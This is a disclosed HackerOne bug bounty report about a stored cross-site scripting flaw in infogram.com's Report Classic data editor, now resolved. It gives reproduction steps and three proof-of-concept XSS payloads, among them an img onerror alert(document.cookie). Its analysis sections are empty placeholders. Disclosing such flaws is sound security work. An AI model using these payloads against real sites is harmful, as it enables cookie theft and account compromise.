---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '282535'
original_report_id: '282535'
title: XSS on Report Classic
weakness: Cross-site Scripting (XSS) - Stored
team_handle: infogram
created_at: '2017-10-24T16:04:51.058Z'
disclosed_at: '2017-11-03T14:14:00.289Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 5
asset_identifier: infogram.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-stored
---

# XSS on Report Classic

## Metadata

- HackerOne Report ID: 282535
- Weakness: Cross-site Scripting (XSS) - Stored
- Program: infogram
- Disclosed At: 2017-11-03T14:14:00.289Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

hi team ... 

i found XSS on https://infogram.com/app/#/library 

#step
..
1- go to https://infogram.com/app/#/library 
2- choose __Report Templates__ . 
3- Use __Report Classic__
4- click to __edit_data__
5- payload  
> <img/ src=1 onerror= alert(document.cookie)>
//#"><svg/onload=prompt(1)>
“><script>alert(document.cookie)</script>

6-execute XSS and which you edit data XSS stared

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
